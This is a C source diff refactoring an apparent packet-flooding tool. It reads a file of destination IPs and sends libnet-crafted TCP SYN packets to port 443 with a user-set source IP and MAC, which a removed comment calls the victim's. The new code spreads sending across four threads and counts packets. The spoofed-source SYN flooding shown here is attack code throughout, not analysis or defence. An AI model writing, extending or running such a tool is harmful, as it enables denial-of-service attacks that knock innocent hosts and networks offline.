@@ -6,72 +6,53 @@
 #include <err.h>
 
 #include "craft_tcp.h"
+#include "data_queue.h"
 #include "process_file.h"
+#include "thread_process.h"
 
 // #define BUFFER_SIZE 1024
 #define BUFFER_SIZE 1024
 
-int i = 0;
 
-
-void processChunk(char* chunk, libnet_t* l, uint32_t srcIP, uint8_t* srcMac, uint8_t* dstMac) {
-    i++;
-    // printf("chunk: %s\n\n", chunk);
-    printf("chunk: %d\n", i);
-    uint16_t srcPort = 49996; // random or fixed port
-    uint16_t dstPort = 443;
-    uint32_t seq = 2508113620;
-    uint32_t ack = 3567497537;
-    uint8_t control = 0x02; // sync
-
-
+void processChunk(IPQueue *q, char* chunk, uint32_t srcIP, uint8_t* srcMac, uint8_t* dstMac) {
     char delim[] = "\n";
     char *ptr = strtok(chunk, delim);
+    Data *data;
     while (ptr != NULL) {
         char *dstIPStr = strdup(ptr);
-        uint32_t dstIP = inet_addr(dstIPStr);
 
-        char errstr[1024];
-        libnet_clear_packet(l);
-        craftTcpPacket(l, srcPort, dstPort, seq, ack,  control,  srcIP,  dstIP,  srcMac,  dstMac, errstr);
-
+        data = (Data*)malloc(sizeof(Data));
+        if (data == NULL) {
+            printf("Failed to assign memory\n");
+            free(data);
+            continue;
+        }
+        data->ip = dstIPStr;
+        IPEnqueue(q, data);
         ptr = strtok(NULL, delim);
     }
 }
 
-int readAndProcessFileByChunk(libnet_t* l) {
+// int readAndProcessFileByChunk(libnet_t* l, char *fileName, char *srcIP, char *srcMac, char *dstMac) {
+int readAndProcessFileByChunk(config cfg) {
     FILE *f;
     char buffer[BUFFER_SIZE];
     size_t bytesRead;
 
-    char *fileName = getenv("FILE");;
-    if (!fileName) {
-        errx(1, "ERROR: failed to load file from environment");
-        return -1;
-    }
+    char* filePath = cfg.filePath;
+    char* srcIP = cfg.srcIP;
+    char* srcMac = cfg.srcMac;
+    char *dstMac = cfg.dstMac;
 
-    f = fopen(fileName, "r");
+    IPQueue *q = IPQueueAlloc();
+
+    f = fopen(filePath, "r");
     if (f == NULL) {
-        errx(1, "failed to open file %s", fileName);
+        errx(1, "failed to open file %s", filePath);
         return -1;
     }
 
-    char *srcIP = getenv("SOURCE_IP");
-    if (!srcIP) {
-        errx(1, "ERROR: failed to load source ip from environment");
-        return -1;
-    } else {
-        warnx("srcIP: %s", srcIP);
-    }
     uint32_t srcIpInt = inet_addr(srcIP);
-
-    char* srcMac = getenv("SOURCE_MAC"); // mac address of victom
-    if (!srcMac) {
-        errx(1, "ERROR: failed to load source mac from environment");
-        return -1;
-    } else {
-        warnx("srcMac: %s", srcMac);
-    }
 
     int r;
     uint8_t* srcMacInt = libnet_hex_aton(srcMac, &r);
@@ -80,14 +61,15 @@ int readAndProcessFileByChunk(libnet_t* l) {
         return -1;
     }
 
-    char *dstMac =  getenv("DEST_MAC"); // ip address of the router that the computer running this program connected to
     uint8_t* dstMacInt = libnet_hex_aton(dstMac, &r);
     if (dstMacInt == NULL) {
-        // sprintf(errstr, "ERROR: invalid dest MAC address");
         errx(1, "ERROR: invalid dest MAC address");
+        return -1;
     }
 
     // read file in chunk and process each chunk
+    // read 1024 bytes first
+    // if it is in the middle of line, continue to read the whole line
     while (1) {
        bytesRead = fread(buffer, 1, BUFFER_SIZE, f);
 
@@ -107,7 +89,7 @@ int readAndProcessFileByChunk(libnet_t* l) {
            chunk[bytesRead+i] = '\0';
 
            // process chunk
-           processChunk(chunk, l, srcIpInt, srcMacInt, dstMacInt);
+           processChunk(q, chunk, srcIpInt, srcMacInt, dstMacInt);
 
            memset(chunk, 0, bytesRead);
        } else {
@@ -118,6 +100,49 @@ int readAndProcessFileByChunk(libnet_t* l) {
        memset(buffer, 0, BUFFER_SIZE);
     }
 
+    int numsThreads = 4;
+    pthread_t threads[numsThreads];
+    struct threadData_ threadDatas[numsThreads];
+    for (long t = 0; t < numsThreads; t++) {
+        threadDatas[t].threadID = t + 1;
+        threadDatas[t].countPackets = 0;
+        threadDatas[t].q = q;
+
+        threadDatas[t].srcIp = srcIpInt;
+        threadDatas[t].srcMac = srcMacInt;
+        threadDatas[t].dstMac = dstMacInt;
+    }
+
+    int rc;
+    for (long t = 0; t < numsThreads; t++) {
+        rc = pthread_create(&threads[t], NULL, process, (void*)&threadDatas[t]);
+        if (rc) {
+            printf("ERROR in creating thread, return code is %d\n", rc);
+            exit(1);
+        }
+    }
+
+    void *status;
+    for (long t = 0; t < numsThreads; t++) {
+        rc = pthread_join(threads[t], &status);
+        if (rc) {
+            printf("ERROR in joining thread return code is %d\n", rc);
+            exit(1);
+        }
+
+        printf("Main: completed join with thread %ld having status of: %s\n", t, (char *)status);
+    }
+
+    int sumPkt = 0;
+    for (long t = 0; t < numsThreads; t++) {
+        printf("Thread %ld packet: %d\n", t, threadDatas[t].countPackets);
+        sumPkt += threadDatas[t].countPackets;
+    }
+    printf("The total number of package from all thread %d\n", sumPkt);
+
+    IPQueueTraversal(q);
+
+    IPQueueFree(q);
     fclose(f);
 
     return 0;
